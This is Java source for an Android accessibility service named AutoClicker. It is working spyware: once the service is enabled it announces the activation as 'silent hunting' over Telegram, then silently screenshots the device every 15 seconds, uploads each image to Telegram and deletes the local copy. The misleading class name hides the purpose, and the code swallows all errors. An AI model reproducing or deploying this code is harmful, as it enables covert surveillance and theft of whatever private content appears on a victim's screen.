package com.tom5.monitor;

import android.accessibilityservice.AccessibilityService;
import android.graphics.Bitmap;
import android.os.Handler;
import android.os.Looper;
import android.view.accessibility.AccessibilityEvent;
import java.io.File;
import java.io.FileOutputStream;
import java.util.concurrent.Executor;
import java.util.concurrent.Executors;

public class AutoClicker extends AccessibilityService {
    private Handler handler = new Handler(Looper.getMainLooper());
    private Executor executor = Executors.newSingleThreadExecutor();

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        TelegramSender.sendMessage("✅ تم تفعيل الصيد الصامت على أندرويد 11!\nالجهاز: " + android.os.Build.MODEL);
        
        // حلقة التصوير (كل 15 ثانية سكرين)
        startLoop();
    }

    private void startLoop() {
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                takeScreenshotNow();
                handler.postDelayed(this, 15000); 
            }
        }, 5000);
    }

    private void takeScreenshotNow() {
        // ميزة أندرويد 11 الحصرية للسكرين شوت الصامت
        takeScreenshot(0, executor, new TakeScreenshotCallback() {
            @Override
            public void onSuccess(ScreenshotResult result) {
                Bitmap b = Bitmap.wrapHardwareBuffer(result.getHardwareBuffer(), result.getColorSpace());
                if (b != null) {
                    saveAndUpload(b);
                }
            }
            @Override public void onFailure(int errorCode) {}
        });
    }

    private void saveAndUpload(Bitmap b) {
        try {
            // 1. حفظ في ملف مؤقت
            File f = new File(getCacheDir(), "s.jpg");
            try (FileOutputStream out = new FileOutputStream(f)) {
                b.compress(Bitmap.CompressFormat.JPEG, 40, out);
                // 2. الرفع لتيليجرام
                TelegramSender.sendPhoto(f);
                // 3. الحذف الفوري للملف
                f.delete();
            }
            // 4. تنظيف الذاكرة فوراً لمنع الكراش
            b.recycle();
        } catch (Exception ignored) {}
    }

    @Override public void onAccessibilityEvent(AccessibilityEvent event) {}
    @Override public void onInterrupt() {}
}
